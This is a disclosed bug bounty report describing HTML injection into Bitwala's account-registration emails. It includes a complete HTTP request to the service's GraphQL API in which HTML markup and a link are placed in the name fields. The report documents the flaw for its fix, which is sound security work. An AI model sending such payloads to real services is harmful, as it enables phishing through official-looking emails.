# HTML injection in email content

## Report Details
- **Report ID**: 786976
- **URL**: https://hackerone.com/reports/786976
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-01-31T17:12:29.088Z
- **Disclosed**: 2020-08-14T20:01:53.588Z

## Reporter
- **Username**: lamscun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nuri

## Vulnerability Information
## Summary:
Hi,

I just found an issue when register account in https://app.bitwala.com/onboarding/preliminary. It allow hacker injection malicious text include html code in email content.
## Steps To Reproduce:
Make request register below with **payload html** in ==firstName== and ==lastName== parameter:

```
POST /graphql HTTP/1.1
Host: api.app.bitwala.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
Authorization: null
Origin: https://app.bitwala.com
Content-Length: 1188
Connection: close

{"operationName":"createIneligibleUser","variables":{"ineligibleUser":{"email":"dr.eamhope.aaa@gmail.com","firstName":"https://abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22<b>hello</b><h1>hacker</h1><a href='abc.com'>XXXX</a>abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc","lastName":"https://abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22<b>hello</b><h1>hacker</h1><a href='abc.com'>XXXX</a>abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc","addressCountry":"US","marketing":true,"locale":"en","token":"03AOLTBLRo4xtiJjci3-KF9cyHrmtCDjr-BORRjZT58NooOV6fkr4VLeRL2SqgVeXdX1NiJQCI6BHk97El0aKwJBuc9iUmtuxvZdvISyEZ4rYVgm3lEG8XxBBuhJzh0L_vUNBdbiOLGjoZyJgGf4R_Y6unX-dg7Wn4kjWDYkE25QIaGFNxS3YzDmp0e3GmN47UhZjpp14KIlfP9dpUqqleJytN2nJs068HfMjZM9d-7Etfv3YG0brkyVP_nMxXouKZARX9d1o7AXMGyykqDWVeB8e0iIuuFHpNkjEIqDVi6Af6Ch87fM5gXwDgr86PAzKyA-vrUZoahuhKhG71N-soh8gn_XsEiqCSGyS76ox20kr40diSu7Hh8Hzt_hKeZ_sMQd_yHqjpbBxkFO_jWSzkpcExmpBb4qHlFW_JrDNEi5gVXeGA3ZJ8CKk","identificationDocumentType":"DE:PASSPORT_ID_CARD"}},"query":"mutation createIneligibleUser($ineligibleUser: CreateIneligibleUserInput!) {\n  createIneligibleUser(ineligibleUser: $ineligibleUser)\n}\n"}
```
 
POC: {F702310}

## Impact

HTML injection, Phishing attacks
This vulnerability can lead to the reformatting/editing of emails from an official email address, which can be used in targeted phishing attacks.
This could lead to users being tricked into giving logins away to malicious attackers.

## Attachments
- html_injection_email.png
